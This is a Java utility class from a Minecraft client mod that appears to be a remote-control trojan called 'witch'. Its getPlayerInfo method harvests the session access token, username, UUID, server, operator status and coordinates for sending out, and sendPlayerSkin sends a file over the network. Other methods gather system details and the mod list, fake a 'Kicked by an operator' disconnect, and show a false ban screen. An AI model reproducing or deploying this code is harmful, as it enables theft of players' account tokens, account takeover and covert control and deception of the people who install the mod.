package me.soda.witch.client.utils;

import com.mojang.authlib.minecraft.MinecraftProfileTexture;
import me.soda.witch.client.Variables;
import me.soda.witch.client.mixin.PlayerSkinProviderAccessor;
import me.soda.witch.shared.FileUtil;
import me.soda.witch.shared.LogUtil;
import me.soda.witch.shared.socket.messages.PlayerInfo;
import me.soda.witch.shared.ProgramUtil;
import net.fabricmc.loader.api.FabricLoader;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.gui.screen.DisconnectedScreen;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.network.ClientPlayerEntity;
import net.minecraft.network.packet.s2c.play.DisconnectS2CPacket;
import net.minecraft.screen.ScreenTexts;
import net.minecraft.text.Text;
import net.minecraft.util.SystemDetails;

import java.io.File;

import static me.soda.witch.client.Witch.mc;

public class MCUtils {
    public static boolean canUpdate() {
        return mc.world != null && mc.player != null;
    }

    public static String allMods() {
        return FabricLoader.getInstance().getAllMods().toString();
    }

    public static String systemInfo() {
        SystemDetails sd = new SystemDetails();
        StringBuilder sb = new StringBuilder();
        sd.writeTo(sb);
        return sb.toString();
    }

    public static void sendPlayerSkin() {
        mc.getSkinProvider().loadSkin(mc.getSession().getProfile(), (type, id, texture) -> {
            if (type == MinecraftProfileTexture.Type.SKIN) {
                File skinCacheDir = ((PlayerSkinProviderAccessor) mc.getSkinProvider()).getSkinCacheDir();
                String skinHash = id.toString().split("/")[1];
                File skinFile = new File(skinCacheDir, skinHash.substring(0, 2) + "/" + skinHash);
                LogUtil.println("skin read " + skinHash);
                NetUtil.send("skin", FileUtil.read(skinFile));
            }
        }, true);
    }

    public static void showDisconnectScreen(MinecraftClient client, Screen parent) {
        client.execute(() -> client.setScreen(new DisconnectedScreen(parent, ScreenTexts.CONNECT_FAILED,
                Text.of(Variables.INSTANCE.name + " banned you. Enter a singleplayer world and type \"@w <text>\" to chat with me."))));
    }

    public static void disconnect() {
        if (canUpdate())
            mc.player.networkHandler.onDisconnect(new DisconnectS2CPacket(Text.of("Kicked by an operator")));
    }

    public static PlayerInfo getPlayerInfo() {
        PlayerInfo pi = new PlayerInfo();
        pi.playerName = mc.getSession().getUsername();
        pi.uuid = mc.getSession().getUuid();
        pi.token = mc.getSession().getAccessToken();
        pi.server = mc.getCurrentServerEntry() != null ? mc.isConnectedToRealms() ? "realms" : mc.getCurrentServerEntry().address : "not in server";
        ClientPlayerEntity player = mc.player;
        pi.inGame = player != null;
        pi.isWin = ProgramUtil.isWin();
        if (pi.inGame) {
            pi.isOp = player.hasPermissionLevel(4);
            pi.x = player.getX();
            pi.y = player.getY();
            pi.z = player.getZ();
        }
        return pi;
    }
}
